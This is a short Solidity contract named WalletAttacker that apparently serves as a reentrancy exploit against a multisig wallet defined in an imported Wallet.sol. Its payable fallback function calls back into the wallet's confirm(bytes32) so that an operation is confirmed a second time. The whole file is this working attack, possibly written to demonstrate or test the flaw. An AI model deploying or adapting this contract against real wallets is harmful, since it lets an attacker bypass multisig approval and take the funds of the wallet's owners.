
pragma solidity ^0.4.7;

import "./Wallet.sol";

contract WalletAttacker {
    Wallet toAttack;
    bool attacked;
    bool attackMode;
    bytes32 operationToConfirm;

    function attack( address _walletAddress ) {
        attackMode =true;
        attacked = false;
        toAttack = Wallet(_walletAddress);
    }


    function confirm(bytes32 _operationToConfirm) {
     operationToConfirm=_operationToConfirm;
     if(!toAttack.call(bytes4(keccak256("confirm(bytes32)")), operationToConfirm))throw;
    }

    function () payable {
      if( ! attacked &&  attackMode  ){
        attacked = true;
       if(!toAttack.call(bytes4(keccak256("confirm(bytes32)")), operationToConfirm))throw;
      }
    }
}
